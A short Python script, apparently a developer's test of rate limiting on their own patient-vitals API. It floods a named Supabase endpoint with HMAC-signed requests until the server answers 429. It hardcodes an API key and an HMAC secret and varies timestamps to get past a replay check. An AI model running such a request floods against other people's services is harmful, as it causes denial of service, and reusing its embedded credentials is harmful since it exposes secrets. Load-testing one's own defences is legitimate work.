import json
import time
import requests
import hmac
import hashlib

API_ENDPOINT = "https://xypxadidbfankltjojdm.supabase.co/functions/v1/vitals-api"
API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh5cHhhZGlkYmZhbmtsdGpvamRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIzMjE3OTEsImV4cCI6MjA3Nzg5Nzc5MX0.rHUf01T7OL6Vx8V3sRygXhMRm6L2wK7uI7mpIF5S2ck"
PATIENT_ID = "p123"
HMAC_SECRET = "my-super-secret-hmac-key-12345"

print("=" * 60)
print("Running Attack 2: DDoS (Request Flood)")
print("This will send valid data as fast as possible.")
print("Press Ctrl+C to stop.")
print("=" * 60)

def sign_payload(payload_json: str, secret: str) -> str:
    key = secret.encode()
    message = payload_json.encode()
    return hmac.new(key, message, hashlib.sha256).hexdigest()

try:
    count = 0
    while True:
        count += 1
        vitals_payload = {"heartRate": 80, "spo2": 98, "temp": 36.5}
        # Must be a unique timestamp to pass Stage 1
        ts = time.time() + count 
        current_time_iso = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime(ts))

        full_payload = {
            "patientId": PATIENT_ID,
            "timestamp": current_time_iso,
            "vitals": vitals_payload
        }
        payload_json = json.dumps(full_payload, separators=(',', ':'))
        signature = sign_payload(payload_json, HMAC_SECRET)
        
        headers = {
            "Content-Type": "application/json",
            "apikey": API_KEY,
            "X-Signature": signature
        }
        
        try:
            response = requests.post(API_ENDPOINT, data=payload_json, headers=headers, timeout=0.5)
            print(f"Request {count}: Status {response.status_code}")
            if response.status_code == 429:
                print("\n--- ATTACK DETECTED! ---")
                print("Success! Server is rate-limiting us (Status 429 - Too Many Requests).")
                print("This proves the DDoS defense is working.")
                break
        except requests.exceptions.ReadTimeout:
            print(f"Request {count}: Timed out (Server is busy)")
        except Exception as e:
            print(f"Request {count}: Error ({e})")
            
except KeyboardInterrupt:
    print("\n\n✓ DDoS attack stopped.")